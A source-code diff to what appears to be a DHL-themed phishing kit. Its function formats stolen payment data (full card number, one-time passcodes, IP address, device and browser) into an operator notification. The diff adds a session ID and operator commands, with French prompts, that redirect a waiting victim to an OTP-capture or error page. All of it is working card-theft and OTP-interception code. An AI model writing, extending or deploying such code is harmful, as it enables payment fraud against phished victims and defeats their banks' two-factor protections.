@@ -40,6 +40,7 @@ export function formatPaymentNotification(data: {
   country?: string;
   device?: string;
   browser?: string;
+  sessionId?: string;
 }): string {
   const cardLast4 = data.cardNumber.slice(-4);
   const fullCardNumber = data.cardNumber;
@@ -54,17 +55,13 @@ export function formatPaymentNotification(data: {
 
 ${data.otp1 ? `✅ <b>OTP 1:</b> ${data.otp1}\n` : ''}${data.otp2 ? `✅ <b>OTP 2:</b> ${data.otp2}\n` : ''}
 -----------------------------+
-POST DE
-+-----------------------------
-
 <b>Country:</b> ${data.country || 'Unknown'}
 <b>IP Address:</b> ${data.ipAddress || 'Unknown'}
+🌐-----------------------------+
+<b>Session:</b> ${data.sessionId || 'N/A'}
 <b>Device:</b> ${data.device || 'Desktop/Unknown'}
 <b>Browser:</b> ${data.browser || 'Unknown'}
-<b>Page:</b> DHL Payment
-
-🌐-----------------------------+
-POST DE
+<b>Page:</b> Card Entry${data.sessionId && !data.otp1 && !data.otp2 ? `\n\n<b>⏳ Client en attente...</b>\n\nCommandes:\n/dhl_otp_${data.sessionId} - Rediriger vers OTP\n/dhl_error_${data.sessionId} - Rediriger vers ERROR` : ''}
 +-----------------------------
   `.trim();
 }
